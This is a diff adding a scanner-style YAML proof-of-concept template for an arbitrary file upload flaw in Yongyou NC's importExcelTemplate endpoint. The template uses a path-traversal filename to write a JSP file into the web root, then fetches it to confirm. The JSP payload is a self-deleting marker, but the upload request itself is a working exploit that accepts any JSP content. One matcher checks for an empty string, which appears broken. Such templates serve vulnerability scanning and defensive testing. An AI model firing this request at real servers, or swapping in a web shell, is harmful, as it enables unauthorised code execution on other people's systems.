@@ -1,0 +1,55 @@
+id: poc-yaml-yongyou-nc-importexceltemplate-anyfile-upload
+info:
+  name: Yongyou NC importExcelTemplate Arbitrary File Upload
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload
+  metadata:
+    product: Yongyou NC
+
+variables:
+  t1: '{{rand_text_alphanumeric(7)}}'
+  t2: '{{base64(t1)}}'
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - id: upload-file
+    name: Upload JSP File
+    method: POST
+    path:
+      - '{{BaseURL}}/portal/pt/infopathimport/importExcelTemplate?pageId=login'
+    headers:
+      Content-Type: 'multipart/form-data; boundary=----WebKitFormBoundary'
+    body: |-
+      ------WebKitFormBoundary
+      Content-Disposition: form-data; name="Filedata"; filename="./.\webapps\nc_web\{{t1}}.jsp"
+      Content-Type: application/octet-stream
+
+      <% out.print("{{t2}}");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
+      ------WebKitFormBoundary--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - ""
+
+  - id: verify-upload
+    name: Verify File Upload
+    method: GET
+    path:
+      - '{{BaseURL}}/{{t1}}.jsp'
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - '{{t2}}'
